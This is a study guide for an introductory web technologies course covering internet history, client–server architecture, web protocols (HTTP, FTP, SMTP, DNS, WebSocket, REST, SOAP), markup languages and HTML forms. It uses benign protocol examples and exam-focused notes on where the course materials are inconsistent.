# CSC_106 — Introduction to Web Technologies

Covers weeks 1 to 12, organised by theme rather than by week.

---

## Orientation: what this course actually is

CSC_106 is a survey course. It contains PHP and JavaScript syntax, but it is not a programming course. It is a course about the **named parts of the web stack**. The exam rewards naming things correctly, listing them in the order the slides listed them, and expanding acronyms exactly. It does not reward elegant code.

One spine runs through it:

1. **The Internet** is the infrastructure. **The World Wide Web** is one application on top of it. (W1)
2. Two machines talk in a **client–server model**: browser and web server. (W1, W10)
3. They talk using **protocols** — HTTP/HTTPS, FTP/SFTP, SMTP/POP3/IMAP, DNS, WebSocket. (W2)
4. What travels is **markup and data**: HTML, XML, SVG, MathML, XHTML, JSON. (W2, W3)
5. The browser renders it, styles it with **CSS**, animates it with **JavaScript** via the **DOM** and **events**. (W4–W7)
6. **Libraries and frameworks** speed that up: jQuery, Lodash, Moment.js; React, Angular, Vue; Django, Express.js, Rails, ASP.NET. (W8)
7. On the server a **backend language** — PHP, Python, Ruby, Node.js, Java — talks to a **database** and exposes an **API**. (W9, W10)
8. All of it must be **secured** and **deployed**. (W11)
9. Then: **WebAssembly, serverless, AI, PWAs, accessibility**. (W12)

**A structural warning.** Each week ships a lecture deck and a one-page Summary sheet, and in several weeks **they describe different topics**. Week 2's Summary says the topic is "HTTP and HTTPS, FTP and SFTP", but the Week 2 deck covers markup languages, email, DNS and web communication protocols — there is **no HTTP or FTP lecture anywhere in the semester**. Week 1's Summary is internet history; its deck is "Introduction to Web Development". Week 6's Summary is events; its deck is async and ES6. Week 12's Summary is entirely Progressive Web Apps, which appear nowhere in its deck.

The exam follows the syllabus, and the syllabus follows the Summary sheets. So topics with no deck behind them are still examinable. Every part below built on missing material is flagged in italics and taught from outside knowledge. Those flags tell you which pages of your notes do not exist.

Separately: every code example in every lecture PDF was a screenshot. Text extraction produced the surrounding prose and nothing between it. Where a slide's example is missing, this guide says so and reconstructs it, marked as a reconstruction. Because you write web code professionally, the reconstructions here are limited to the ones that carry exam content; obvious HTML, CSS and JavaScript syntax is not repeated back to you.

---

## Part 1 — The Internet and the World Wide Web (Week 1)

*The Week 1 deck is "Introduction to Web Development" and covers no internet history. Everything here comes from the Week 1 Summary sheet — seven bullet points — expanded from outside knowledge and marked where it goes further.*

### What it is, in the slides' terms

The **Internet** is "a worldwide network of interconnected computers and devices". It began as **ARPANET**, "initially developed for military purposes", later "expanded to academic use".

The **World Wide Web** was "introduced by **Sir Tim Berners-Lee**" in **1989**: interconnected pages joined by **hyperlinks**, an *application built on top of* the Internet.

Memorise that shape exactly: **the Internet is infrastructure; the Web is an application running on it.** The sheet states it twice, which in this course signals an exam item.

### How it works

The Internet is packet-switched: data is split into packets, each routed independently by **IP** address, reassembled at the destination, with **TCP** layered above for reliable ordered delivery. The Web sits far above that: a document identified by a **URL**, fetched over **HTTP**, written in **HTML**. Hyperlinks are the actual innovation — any document may point at any other, anywhere, without coordination.

*(Not from the course deck: Berners-Lee, at CERN, specified three things together — HTML, HTTP and URIs — and wrote the first browser and server. The Web was placed in the public domain in 1993.)*

The cleanest proof the two are different: **email runs on the Internet but not on the Web.** So do FTP and Usenet, and all three predate the Web by years. ARPANET's first message was 1969, twenty years earlier.

### Concrete example

```
Internet                         World Wide Web
------------------------------   ---------------------------------
Global network of networks       A service running over that network
Originated as ARPANET            Introduced 1989 by Sir Tim Berners-Lee
  (military -> academic)
Moves packets between hosts      Moves documents browser <-> server
Carries many services:           Is one of those services
  Web, email, FTP, VoIP
Addressed by IP addresses        Addressed by URLs
```

### Where people go wrong

- Using "Internet" and "Web" interchangeably. The sheet explicitly names this as the error.
- Crediting Berners-Lee with the Internet. He introduced the **Web**, 1989. ARPANET is not his.
- Giving 1990 or 1991 for the Web. Other sources do; **the course says 1989**.
- Saying ARPANET was academic from the start. Military first, academic later.

### In the exam

Expect "Distinguish between the Internet and the World Wide Web": four lines — infrastructure vs application, ARPANET origin, Berners-Lee 1989, hyperlinks. Also expect the sheet's own phrasing, "How did the Internet evolve from a military communication network to a global platform?" — answer ARPANET → academic expansion → dial-up → broadband, with the stated impacts on education, commerce and global awareness.

Memorise exactly: **ARPANET**; **Sir Tim Berners-Lee**; **1989**; **hyperlinks**; "the Internet is infrastructure, the Web is an application built upon it".

---

## Part 2 — Clients, servers and the client–server model (Weeks 1, 10, 11)

### What it is, in the slides' terms

**Web development** is "the process of creating websites and web applications for the internet", splitting into **front-end** (user interface) and **back-end** (server logic and databases). Named technologies: **HTML, CSS, JavaScript and Node.js**.

**Web browsers** "interpret and display web content" — Chrome, Firefox, Safari, Edge. **Web servers** are "specialised software **or hardware** that store, manage, and serve web content" — Apache, Nginx, Microsoft IIS.

The **client–server model**: the client initiates by requesting resources; the server processes requests and delivers content.

### The examinable lists

**Key components** of browsers and servers, three items: **URL (Uniform Resource Locator)**, web addresses specifying the location of resources; **HTTP (Hypertext Transfer Protocol)**, the protocol for browser–server communication; **HTML, CSS and JavaScript**, the core technologies for creating and displaying content.

**Browser functionality**, five in slide order: rendering web pages; user interface; extensions and plugins; bookmarking and history; security.

**Server functionality**, five in slide order: request handling; data storage; dynamic content generation; security (HTTPS, "data in transit and at rest"); load balancing.

**Types of server** — four, each with named examples. One of the likeliest list questions on the paper:

| Type | Function | Examples named |
|---|---|---|
| Web server | Serve web content, handle HTTP requests | Apache, Nginx, Microsoft IIS |
| Database server | Manage data storage and retrieval | MySQL, PostgreSQL, MongoDB |
| Application server | Execute application-specific code | Node.js |
| Proxy server | Intermediary between clients and other servers | (caching, load balancing, security) |

Each is broken down further. **Web servers**: process HTTP requests; locate and retrieve resources; deliver HTML, CSS, JavaScript and other files; handle routing. **Database servers**: store structured data; manage integrity and security; process queries; enforce consistency and validation rules. **Application servers**: process requests and application logic; manage sessions and state; interact with databases and external services; generate dynamic content. **Proxy servers**: caching; load balancing; filtering and inspecting requests for security.

**Advantages of client–server architecture** — three, and only three: **scalability**, **centralised data management**, **separation of concerns**.

### Concrete example — the interaction sequence

The deck states this as a four-step sequence and then asks it as a mid-lesson question, which makes it close to guaranteed:

```
1. A user enters a URL or clicks a link in the browser.
2. The browser sends an HTTP request to the appropriate web server.
3. The server processes the request, retrieves the requested resource,
   and sends an HTTP response back to the browser.
4. The browser renders and displays the received content to the user.
```

### Web development tools (Week 1)

Three **key categories**:

1. **Text editors and IDEs.** Text editors are "lightweight applications for writing and editing code" — **Visual Studio Code, Sublime Text, Atom**. IDEs are "comprehensive development environments providing code editing, debugging, and other features" — **JetBrains WebStorm, Microsoft Visual Studio, Eclipse**.
2. **Browser developer tools** — inspect and manipulate elements, debug JavaScript, analyse network traffic, optimise performance.
3. **Version control systems (VCS)** — **Git**, "distributed" with "branching capabilities"; **GitHub** and **GitLab** as hosting and collaboration platforms.

**Role of VCS**, four items: **code collaboration**, **version history**, **branching and merging**, **code backup**.

### Where people go wrong

- **The VS Code / IDE boundary.** The course puts **Visual Studio Code** under *text editors* and **Microsoft Visual Studio** under *IDEs*. By any working definition VS Code is an IDE. In the exam it is a text editor. Do not correct the course.
- **Node.js** is listed as an *application server*, not a web server, and separately as a backend language in Week 10. If asked for an application server example, "Node.js" is the expected answer — it is the only one named.
- Answering "the backend" when asked about servers. The exam wants the four-way taxonomy.

### In the exam

"Describe the sequence of actions between browser and server when a user clicks a link" (the four steps). "List and explain four types of server" (the table). "State three advantages of client–server architecture." Expansions: **URL**, **HTTP**, **VCS**, **IDE**.

---

## Part 3 — HTTP and HTTPS (Week 2 syllabus topic)

*There is **no lecture deck for this topic anywhere in the twelve weeks**. The Week 2 Summary names it as the week's topic and gives four bullet points about it; the deck covers something else. Everything beyond those bullets is **not from the course deck**. Assume it is examinable — but a marker working from the deck may expect only the bullets.*

### What the course actually says

- HTTP is the basis of web data communication, but it **lacks security**.
- HTTPS is the **secure version** of HTTP, offering **encryption and data protection**.
- Plain HTTP leaves data **vulnerable** in transit.
- Embracing HTTPS **enhances digital security and data privacy**.

If a question says "differentiate between HTTP and HTTPS", that is the answer: HTTP transmits in plaintext and is open to interception; HTTPS adds encryption, ensuring confidentiality in transmission.

### How it works — not from the course deck

HTTP is a **stateless, text-based, request–response protocol**. Stateless means the server keeps no memory between requests; sessions and carts are layered on with cookies and tokens.

A request is a **request line** (method, path, version), **headers**, blank line, optional **body**. A response is a **status line** (version, code, reason), **headers**, blank line, optional **body**.

**Methods.** The course names four across Weeks 2 and 10: **GET** (retrieve), **POST** (create), **PUT** (update), **DELETE** (remove). Beyond those: HEAD, PATCH, OPTIONS, CONNECT, TRACE.

**Status code classes:**

| Class | Meaning | Examples |
|---|---|---|
| 1xx | Informational | 100 Continue, 101 Switching Protocols |
| 2xx | Success | 200 OK, 201 Created, 204 No Content |
| 3xx | Redirection | 301 Moved Permanently, 302 Found, 304 Not Modified |
| 4xx | Client error | 400, 401 Unauthorised, 403 Forbidden, 404 Not Found, 429 |
| 5xx | Server error | 500 Internal Server Error, 502 Bad Gateway, 503 Service Unavailable |

**Ports: HTTP is 80, HTTPS is 443.**

**HTTPS** is HTTP inside **TLS (Transport Layer Security)**, successor to **SSL (Secure Sockets Layer)**. The Week 11 Summary uses the phrase "SSL/TLS encryption" — use that phrase. TLS provides **confidentiality**, **integrity** and **authentication** (a CA-signed certificate proves the server's identity).

**Versions.** HTTP/1.1 (text, keep-alive), HTTP/2 (binary framing, multiplexing, header compression), HTTP/3 (over QUIC on UDP). The course's key-reference list includes *Learning HTTP/2*, the only hint in the semester that HTTP/2 exists.

### Concrete example

```http
GET /courses/csc106 HTTP/1.1
Host: www.mivastudents.com
Accept: text/html
```

```http
HTTP/1.1 200 OK
Server: nginx/1.24.0
Content-Type: text/html; charset=UTF-8
Content-Length: 1843

<!DOCTYPE html>...
```

A form POST, tying Week 3 to this part:

```http
POST /login HTTP/1.1
Host: www.mivastudents.com
Content-Type: application/x-www-form-urlencoded

username=ade&password=secret123
```

Over plain HTTP every byte of that, `password=secret123` included, is readable by anyone on the path. That is what "vulnerable" means.

### Where people go wrong

- **The Week 3 deck says POST sends data "securely to the server".** That is a real error, not a simplification. POST is not encrypted. It moves data out of the URL into the body, keeping it out of history, bookmarks and server logs — a privacy gain, not encryption. If asked why POST suits passwords, write: *the data is in the request body rather than the URL, so it is not logged or bookmarked; but it is only secure over HTTPS.* That is correct and still contains the marker's keyword.
- Calling HTTPS "a different protocol". It is HTTP inside a TLS tunnel.
- Confusing SSL and TLS. SSL is deprecated; TLS replaced it; write **SSL/TLS**.
- Thinking stateless means logins are impossible. State is layered on with **cookies or session management** — the Week 10 Summary's own phrase.

### In the exam

Most likely the plain contrast: HTTP lacks encryption, HTTPS adds it, protecting confidentiality in transit. If the paper is more technical: the request/response cycle, four methods, the 4xx and 5xx families, ports 80 and 443.

Memorise: **HTTP = Hypertext Transfer Protocol**; **HTTPS = ...Secure**; **SSL = Secure Sockets Layer**; **TLS = Transport Layer Security**; **80 / 443**.

---

## Part 4 — FTP and SFTP (Week 2 syllabus topic)

*Also **no lecture deck**. The course's entire content is three bullet points on the Week 2 Summary. The rest is **not from the course deck**.*

### What the course actually says

- **FTP** is used for file transfers but **lacks encryption**, making data vulnerable.
- **SFTP** is a **secure extension of FTP**, using **encryption and strong authentication**.
- Embracing SFTP enhances digital security and data privacy.

The Week 2 case study frames it as a small business or healthcare organisation moving to SFTP for compliance.

### How it works — not from the course deck

**FTP (File Transfer Protocol)** predates the Web and uses **two connections**: a **control connection** on port **21** for commands, and a **data connection** on port **20** for file bytes. In **active mode** the *server* opens the data connection back to the client (breaks behind NAT and firewalls); in **passive mode** the *client* opens both, which is what everything uses now. FTP sends usernames and passwords in **plaintext** — that is the vulnerability.

**SFTP** is **SSH File Transfer Protocol**. Despite the name, **it is not FTP**: it is a separate protocol running as a subsystem of **SSH (Secure Shell)** on port **22**, over a single encrypted connection, authenticating by password or public key.

**FTPS** is the third and the one students confuse with SFTP: FTPS *is* real FTP with TLS added, on ports 21 or 990.

| | FTP | SFTP | FTPS |
|---|---|---|---|
| Port | 21 control, 20 data | 22 | 21 or 990 |
| Encrypted | No | Yes | Yes |
| Underlying protocol | Its own | SSH | FTP + TLS |
| Connections | Two | One | Two |

### Concrete example

```
220 ftp.example.com FTP server ready
USER ade
331 Password required for ade
PASS secret123              <- travels in the clear
230 User ade logged in
PASV
227 Entering Passive Mode (192,0,2,1,195,80)
RETR report.pdf
226 Transfer complete
QUIT
```

The SFTP equivalent runs the whole session, authentication included, inside an encrypted SSH channel.

### Where people go wrong

- **Believing SFTP is "FTP with encryption added".** The course's phrase, "a secure extension of FTP", encourages this and it is technically wrong — SFTP shares no code, commands or port with FTP. **Write the course's phrase in the exam**, because it is the marking scheme's wording, then add "it operates over SSH on port 22", which is correct and shows more. Do not lead with the correction.
- Confusing SFTP with FTPS.
- Forgetting that FTP's exposure is **credentials** as much as file contents.

### In the exam

Expect the parallel to HTTP/HTTPS, or the case-study question almost verbatim: "What are the security risks of using FTP for financial data, and how does SFTP address them?" Answer: FTP transmits data *and credentials* unencrypted, so anyone on the network path can intercept them; SFTP encrypts the transfer and uses strong authentication, supporting regulatory compliance.

Memorise: **FTP = File Transfer Protocol**, port 21; **SFTP = SSH/Secure File Transfer Protocol**, port 22; **SSH = Secure Shell**.
---

## Part 5 — Markup languages (Week 2)

### What it is, in the slides' terms

"Markup languages are the backbone of structured content presentation. They provide a standardised way to format and describe data or documents, making them **machine-readable and human-understandable**." That is the definition to write down.

Five are named. Learn all five with expansion and one-line purpose — a "list five markup languages and state the primary use of each" question is close to inevitable.

| Language | Expansion | Primary use |
|---|---|---|
| HTML | HyperText Markup Language | Creating and structuring web content |
| XML | eXtensible Markup Language | Storing, exchanging and representing structured data |
| SVG | Scalable Vector Graphics | Describing two-dimensional vector graphics |
| MathML | Mathematical Markup Language | Representing mathematical notation and equations |
| XHTML | Extensible HyperText Markup Language | HTML reformulated as an XML application |

### How each one works

**HTML** "defines the layout and presentation of web pages using a system of **elements, tags, and attributes**" (Part 9).

**XML** "employs a **user-defined set of tags** to describe data" — that phrase is the discriminator between XML and HTML: HTML's tags are fixed by specification, XML's are invented by the document's author. Two named uses: **data storage** (hierarchical, exchangeable between different systems) and **data exchange** (web services, configuration files, RSS feeds).

**SVG** describes graphics as shapes and coordinates rather than pixels, so they "can be scaled without losing image quality". Named uses: logos, icons, illustrations, interactive diagrams; named strength: adapting to different screen sizes and resolutions.

**MathML** is "designed **based on XML**" — that dependency is examinable. Named uses: educational sites, scientific publications, any content with mathematical expressions.

**XHTML** "reformulates HTML as an XML application" and "combines the best of XML's strictness with HTML's familiarity" — every tag closed, every attribute quoted, the document well-formed or it fails to parse.

### Concrete example

*Reconstruction. The deck has slides titled "Html: example", "Xml: example", "Svg: example", "MathML: example" and "XHTML: example". Every one was an image and extracted as an empty slide. HTML and SVG are omitted here as you write both daily; the two you may not have written recently:*

XML — note that `book`, `title`, `author` and `price` are invented by the author; no specification defines them. This is also the answer to the Week 2 mid-lesson question:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<library>
  <book>
    <title>JavaScript: The Good Parts</title>
    <author>Douglas Crockford</author>
    <price>19.50</price>
  </book>
</library>
```

MathML, expressing x² + y²:

```xml
<math xmlns="http://www.w3.org/1998/Math/MathML">
  <mrow>
    <msup><mi>x</mi><mn>2</mn></msup>
    <mo>+</mo>
    <msup><mi>y</mi><mn>2</mn></msup>
  </mrow>
</math>
```

### Where people go wrong

- **"XHTML is used in modern web development."** The deck says this; it has not been true since roughly 2010. **Answer as the deck does** — XHTML brings XML strictness and ensures clean, well-structured, standardised markup. You lose marks for being right about the industry and wrong about the slide.
- Calling XML a *presentation* language. XML describes data and says nothing about appearance.
- Forgetting MathML is XML-based.
- Treating SVG as an image format like PNG. It is markup — text you write and style with CSS, which is why it belongs in this lecture.

### In the exam

Highly likely, straight from the learning objectives: "Compare and contrast the features, advantages and disadvantages of different markup languages." Also the two mid-lesson tasks: an HTML snippet with a heading, paragraph and link; and the XML book list.

Memorise: all five expansions; **"XML uses user-defined tags"**; **"MathML is based on XML"**; **"XHTML reformulates HTML as an XML application"**.

---

## Part 6 — Email protocols and MIME (Week 2)

### What it is, in the slides' terms

Four named standards. Which direction each moves mail is where the marks are.

| Protocol | Expansion | Direction | Function |
|---|---|---|---|
| SMTP | Simple Mail Transfer Protocol | **Sending** / relaying | Sends outgoing mail to the recipient's server |
| POP3 | Post Office Protocol version 3 | **Retrieval** | Downloads messages to the device for offline access |
| IMAP | Internet Message Access Protocol | **Retrieval** | Keeps messages on the server, synchronises devices |
| MIME | Multipurpose Internet Mail Extensions | Message format | Extends email beyond ASCII; attachments |

**SMTP** — two key functions: **sending email** ("specifies the rules for routing and delivering email to the recipient's server") and **relaying** ("SMTP servers can relay messages to other servers... across different domains").

**POP3** — two key functions: **email retrieval** and **offline access**. Critical clause: "messages are typically **downloaded and removed from the server**."

**IMAP** — two key functions: **email synchronisation** ("actions taken on one device — reading or deleting — are reflected on others") and **server-based storage** ("keep emails centralised on the server rather than downloading them").

**MIME** — three key functions: **message formatting** (rich text, HTML, attachments), **multimedia support** (images, audio, video), **character encoding** ("ensuring that text in various languages can be properly displayed").

### How it works

SMTP is a command-and-response protocol. The deck names the commands explicitly, so they are examinable: **HELO**, **MAIL FROM**, **RCPT TO**, then the message content. Learn those four in order.

*Not from the course deck:* ports are SMTP **25** (relay), **587** (client submission), **465** (legacy SMTPS); POP3 **110** / **995**; IMAP **143** / **993**. MIME's `Content-Type` header is the same mechanism HTTP uses — which is why the Week 3 file-upload slide mentions `multipart/form-data`. MIME types and HTTP content types are one system.

### Concrete example

```
220 smtp.example.com ESMTP ready
HELO mail.miva.edu.ng
250 Hello mail.miva.edu.ng
MAIL FROM:<ade@miva.edu.ng>
250 Sender OK
RCPT TO:<lecturer@example.com>
250 Recipient OK
DATA
354 Start mail input; end with <CRLF>.<CRLF>
Subject: Assignment submission
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="XYZ"

--XYZ
Content-Type: text/plain; charset=UTF-8

Please find my assignment attached.
--XYZ
Content-Type: application/pdf
Content-Disposition: attachment; filename="assignment.pdf"
Content-Transfer-Encoding: base64

JVBERi0xLjQKJcfsj6IKNSAwIG9iago8PC9MZW5ndGgg...
--XYZ--
.
250 Message accepted for delivery
QUIT
```

The MIME headers in the middle are precisely what MIME adds. Without them that message could carry plain ASCII text and nothing else.

### Where people go wrong

- **Saying SMTP retrieves mail.** SMTP only sends and relays. Retrieval is POP3 or IMAP. This is the commonest mix-up and the easiest mark to lose.
- **Reversing POP3 and IMAP.** Mnemonic: **P**OP **P**ulls it down and deletes; **I**MAP leaves **I**t there. Multiple devices → IMAP. Offline on one machine → POP3.
- Calling MIME a protocol. It is a **standard** that extends the message *format*; it moves nothing.
- Nobody configures POP3 any more and webmail hides all of it. The exam still wants four separate named protocols.

### In the exam

"Explain the roles of SMTP, POP3 and IMAP" or "Differentiate between POP3 and IMAP", plus a one-liner on MIME. If asked to illustrate SMTP, name **HELO, MAIL FROM, RCPT TO** and the message content, in order.

Memorise: all four expansions; **POP3 downloads and removes**; **IMAP keeps and synchronises**; **SMTP sends and relays**; MIME = formatting, multimedia, character encoding.

---

## Part 7 — The Domain Name System (Week 2)

### What it is, in the slides' terms

"DNS is a fundamental component of the internet that converts **human-readable domain names** (e.g. www.example.com) into **IP addresses** (e.g. 192.0.2.1)." **Domain name resolution** is "the process of translating a human-readable domain name into an IP address".

Two **key functions**: **name-to-IP-address mapping**, and **reverse DNS lookup** (IP back to domain name). The reverse lookup is one of only two, so it is half the marks on "state the key functions of DNS".

### The hierarchy

Four levels, an ordered list and the most examinable part of this material:

1. **Root domain** — "the highest level in the DNS hierarchy"; contains the TLDs.
2. **TLDs (Top-Level Domains)** — **gTLDs** (generic, `.com`) and **ccTLDs** (country-code, `.uk`; Nigeria's is `.ng`).
3. **Second-level domains** — created under TLDs, e.g. `example` in `example.com`.
4. **Subdomains** — further divisions, e.g. `www.example.com`, `admin.example.com`.

The deck's own worked illustration, which you should be able to reproduce for any domain handed to you:

```
admin.example.com
  |      |     |
  |      |     +--  "com"      is the TLD
  |      +--------  "example"  is the second-level domain
  +---------------  "admin"    is a subdomain of "example"
```

**Other components**: **DNS servers** (store records and answer queries — **recursive**, **authoritative**, **root**); **resolvers** (software on client devices or in the network that initiates queries); **authoritative servers** (hold the records for specific domains).

### Concrete example — a resolution walked through

*The deck names the components but never walks a query. Reconstructed from the components it names:*

```
Browser wants www.example.com

1. Browser cache, then OS stub resolver.            -> miss
2. Resolver asks the RECURSIVE server.              -> miss; it starts asking
3. Recursive asks a ROOT server: "who handles .com?"
       -> "ask the .com TLD servers"
4. Recursive asks the .com TLD server: "who handles example.com?"
       -> "ask ns1.example.com, the AUTHORITATIVE server"
5. Recursive asks the authoritative server for the A record
       -> "192.0.2.1"
6. Recursive caches it and returns it to the resolver.
7. Browser opens TCP to 192.0.2.1 and sends its HTTP request.
```

Only at step 7 does anything from Part 3 begin. DNS runs before every HTTP request to a new hostname.

**DNS in internet navigation** — three named functions: **website access**; **email delivery** via **MX (Mail Exchanger) records**, which specify a domain's mail servers — this is how SMTP from Part 6 finds the recipient; **service discovery** ("such as SIP servers for VoIP").

### DNS security

**DNSSEC (Domain Name System Security Extensions)** is "a set of extensions to DNS designed to secure the DNS protocol". Three named aspects: DNSSEC adds **digital signatures** to DNS data, ensuring **data integrity and authenticity**; **cache poisoning prevention**, by verifying the authenticity of responses; **DDoS mitigation**, since DNS servers must withstand **Distributed Denial of Service** attacks.

Note carefully: DNSSEC **signs**, it does not **encrypt**. It guarantees the answer is genuine, not that the query is private.

### Where people go wrong

- Saying DNSSEC encrypts DNS traffic. It authenticates with digital signatures.
- Muddling server types: **root** points at TLDs; **TLD** points at authoritative; **authoritative** holds the records; **recursive** does the legwork; **resolver** is the client-side piece that starts it.
- Reading a domain left-to-right and calling `admin` the TLD. Read right-to-left.

### In the exam

Near-certain: "Using admin.example.com, identify the TLD, the second-level domain and the subdomain." Also: "List and explain the key components of DNS"; "What is DNSSEC and what does it protect against?"

Memorise: **DNS = Domain Name System**; **TLD = Top-Level Domain**; **gTLD / ccTLD**; **MX = Mail Exchanger**; **DNSSEC = Domain Name System Security Extensions**; **DDoS = Distributed Denial of Service**.

---

## Part 8 — Web communication protocols: WebSocket, REST and SOAP (Week 2)

### What it is, in the slides' terms

**WebSocket** — "a communication protocol that provides **full-duplex, bidirectional communication channels over a single TCP connection**", designed for real-time interactive applications. Four characteristics: **full-duplex** (both sides send simultaneously without repeated HTTP requests), **low latency**, **persistent connection** (less overhead than traditional HTTP), **usage** — real-time applications, live chat, online gaming, stock market updates.

**REST (Representational State Transfer)** — "an **architectural style** and set of constraints for designing networked applications. It uses standard HTTP methods... and is designed to be simple and stateless." Four characteristics: **stateless** ("each request must contain all necessary information for processing"), **resource-based** (resources modelled as URLs, manipulated with GET/POST/PUT/DELETE), **use of HTTP**, **usage** — APIs, CRUD, scalable web applications.

**SOAP (Simple Object Access Protocol)** — "a protocol for exchanging structured information in the implementation of web services", using **XML-based messages**. Four characteristics: **XML-based** (platform-independent, self-descriptive), **strict protocol** (predefined rules, "less flexible than REST"), **complexity**, **usage** — legacy systems, enterprise applications, services requiring high security and reliability.

### Advantages and disadvantages — a guaranteed list question

| | Advantages | Disadvantages |
|---|---|---|
| **WebSocket** | Real-time communication; low latency; efficient for live applications | Not suitable for all web applications; may require additional server support |
| **REST** | Simplicity; statelessness; compatibility with HTTP; widely adopted | Not ideal for real-time; limited to request–response |
| **SOAP** | Strict rules for data integrity; security features; platform independence | Complexity; slower than REST; less popular in web development |

### Concrete example

The deck's own REST illustration, mapping HTTP methods onto CRUD:

```
GET    /users        -> retrieve data
POST   /users        -> create data
PUT    /users/123    -> update data
DELETE /users/123    -> remove data
```

*Reconstruction — the deck describes a SOAP message but never shows one. This is why "complexity" is its listed disadvantage:*

```xml
<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
  <soap:Body>
    <getUser xmlns="http://example.com/users">
      <userId>123</userId>
    </getUser>
  </soap:Body>
</soap:Envelope>
```

The REST equivalent is the single line `GET /users/123`. That contrast *is* the answer to "compare REST and SOAP".

*Reconstruction — the WebSocket handshake, showing the upgrade out of HTTP:*

```http
GET /chat HTTP/1.1
Host: example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
```

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
```

After the `101` the connection is no longer HTTP: either side may send frames at any time until one closes it.

### Where people go wrong

- **REST is not a protocol.** The deck's slide calls it "an architectural style and set of constraints", then files it under a heading called "Web Communication Protocols". **The course contradicts itself.** Write: *"REST is an architectural style, not a protocol; it is built on HTTP."* That uses the deck's own words, so it cannot be marked wrong.
- **SOAP's expansion.** The W3C dropped the acronym at SOAP 1.2. **Answer "Simple Object Access Protocol"** — that is what the marking scheme has.
- Saying WebSocket "replaces" HTTP. It begins as an HTTP request and upgrades.
- **The deck asks "What is a TCP connection?" on the WebSocket slide and never answers it.** For safety, and **not from the course deck**: TCP (Transmission Control Protocol) provides a reliable, ordered, connection-oriented byte stream between two hosts, established by a three-way handshake (SYN, SYN-ACK, ACK). WebSocket, HTTP and SMTP all run over it.
- Professionally you call any JSON HTTP API "REST" regardless of constraints. The exam wants the constraints named: stateless, resource-based, uses HTTP methods.

### In the exam

Very likely: "Compare WebSocket, REST and SOAP, stating one advantage and one disadvantage of each" — reproduce the table. Also: "Give the HTTP method used to create, read, update and delete a resource"; "Why is REST described as stateless?"

Memorise: **REST = Representational State Transfer**; **SOAP = Simple Object Access Protocol**; **CRUD = Create, Read, Update, Delete**; **full-duplex**; **stateless**; **resource-based**.
---

## Part 9 — HTML: structure, hyperlinks and forms (Week 3)

*Every code example in the Week 3 deck was a screenshot; the prose survived extraction, the code did not. Since you write HTML professionally, only the exam-bearing fragments are reconstructed here.*

### What it is, in the slides' terms

"HTML, which stands for HyperText Markup Language, is the standard language used to create web pages. It provides the **structure and format** for web content", using **tags** to describe content and how it should be displayed.

Four named document components — expect this as a list question:

1. **Document Type Declaration (`<!DOCTYPE>`)** — "the very first line", telling the browser which version of HTML is used so it renders correctly.
2. **HTML element (`<html>`)** — "the root element", containing all others.
3. **Head section (`<head>`)** — meta-information: title, character encoding, links to external resources. "**It is not visible to the user.**" Contains `<meta>`, `<title>`, `<link>`, `<script>`.
4. **Body section (`<body>`)** — "the visible content of the web page".

An **element** is "a pair of tags, an opening tag and a closing tag... the closing tag is the same but with a **forward slash (/)** before the element name. Elements can also have **attributes**, which provide additional information."

### The element inventory

| Element | Purpose as stated in the deck |
|---|---|
| `<h1>`–`<h6>` | Structure and hierarchy; **six levels**, `<h1>` highest, `<h6>` lowest |
| `<p>` | Paragraphs of text |
| `<a>` | Hyperlinks; **`href`** specifies the URL |
| `<ol>` / `<ul>` | Ordered and unordered lists |
| `<img>` | Embed images; **`src`** the file source, **`alt`** alternative text |
| `<div>` | Block container grouping content for styling or scripting |
| `<span>` | **Inline** container for styling specific parts of text |
| `<form>` | Collects user input |
| `<table>`, `<tr>`, `<th>`, `<td>` | Table, row, header, data |
| `<dl>`, `<dt>`, `<dd>` | Definition list, term, definition |
| `<button>` | Clickable buttons that trigger actions |
| `<audio>`, `<video>` | Media elements |
| `<iframe>` | Embed external content such as maps or other pages |
| `<br>` | Line break |
| `<!-- -->` | Comments, or hiding content from rendering |

**Semantic elements** "provide meaning to the structure of a web page and improve **accessibility** for users and search engines": `<header>`, `<nav>`, `<main>`, `<article>`, `<section>`, `<footer>`.

Three **text formatting** elements come from the mid-lesson answer, so they are examinable verbatim: `<strong>` ("strong importance or emphasis, typically displayed as bold"), `<em>` ("emphasise text, typically displayed as italicised"), `<u>` ("underline text for visual emphasis").

### Hyperlinks and navigation

**Anchor text** is "the visible and clickable part of a hyperlink that describes the linked content". Four **link presentations**: **text links**, **image links**, **button links**, **navigation menus**.

**Internal links** navigate within the same site; **external links** "provide the complete URL, including the protocol (http:// or https://)". **`target="_blank"`** opens an external link in a new tab or window. In-page navigation uses `<a href="#id">` with a matching `id` on the target element.

**Best practices for hyperlinks and navigation** — eight items, a strong candidate for "state five best practices":

1. **Use descriptive text** — anchor text that accurately describes the linked content.
2. **Clear visual indicators** — underlining, colour, styling that signals clickability.
3. **Consistent navigation** — keep menus consistent across the site.
4. **Test external links** — broken links frustrate users.
5. **Mobile-friendly navigation** — responsive menus and links.
6. **Consider accessibility** — meaningful alternative text; screen readers must interpret links.
7. **Use proper link tags** — `<nav>` for menus, `<button>` for interactive links.
8. **Avoid overwhelming links** — prioritise and organise; do not clutter.

### Web forms

Five vocabulary terms defined separately, and the exam may ask you to distinguish them: **form** (a collection of input elements and controls used to collect and submit user data); **input element** (allows users to enter or select data); **control** (an interactive element such as a button or dropdown); **field** (a specific area for entering data); **label** (a descriptive element associated with an input field, providing context).

Two attributes on `<form>` carry the marks: **`action`** ("the URL where the form data will be sent... typically points to a server-side script") and **`method`** ("the HTTP method used to send the form data. The two common methods are **GET** and **POST**").

**Common input elements**, in the deck's order: `<input type="text">`, `type="password"` (conceals text), `type="email"` ("includes built-in validation for email format"), `type="radio"` ("one option from mutually exclusive choices"), `type="checkbox"` ("one or more options"), `<select>` (dropdown / select menu), `<textarea>` (multi-line), `<button>`.

**Input attributes** — nine: **`name`** (used when submitting form data), **`id`** (unique identifier, used with labels), **`value`**, **`placeholder`**, **`required`**, **`disabled`**, **`maxlength`**, **`min`/`max`**, **`multiple`**.

